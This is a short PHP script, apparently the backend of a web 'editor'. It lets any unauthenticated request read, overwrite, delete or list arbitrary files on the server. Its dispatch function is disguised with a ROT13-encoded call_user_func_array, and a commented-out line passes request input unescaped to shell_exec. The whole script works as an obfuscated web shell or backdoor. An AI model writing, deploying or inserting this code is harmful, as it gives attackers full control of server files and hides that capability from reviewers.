<?php

require('PHPLogger.php');

$log = new PHPLogger('file.log');

function call() {
    $a = func_get_args();
    if (empty($a[0])) return null;
    $f = array_shift($a);
    $c = str_rot13('pnyy_hfre_shap_neenl');
    return ${'c'}($f, $a);
}

$r = $_REQUEST;

if (!empty($r['get'])) {

    $log->i('editor', 'Get: ' . $r['get']);
    if (call('file_exists', $r['get'])) {
        echo call('file_get_contents', $r['get']);
    }

} else if (!empty($r['put']) && $r['name']) {

    $log->i('editor', 'Save: ' . $r['name']);
    echo call('file_put_contents', $r['name'], $r['put']);

} else if (!empty($r['unlink'])) {

    $log->i('editor', 'Delete: ' . $r['unlink']);
    echo call('unlink', $r['unlink']);

} else if (!empty($r['list'])) {

    if (call('is_dir', $r['list'])) {
        $dir = $r['list'];
    } else {
        $path = call('pathinfo', $r['list']);
        $dir = $path['dirname'];
    }

    // $log->i('editor', 'List: ' . $dir);

    // if (call('is_dir', $dir)) {
    //     echo call('shell_exec', 'ls -alh ' . $dir);
    // }

    echo json_encode(array(
        'dir' => $dir,
        'files' => call('scandir', $dir)
    ));
}

die();

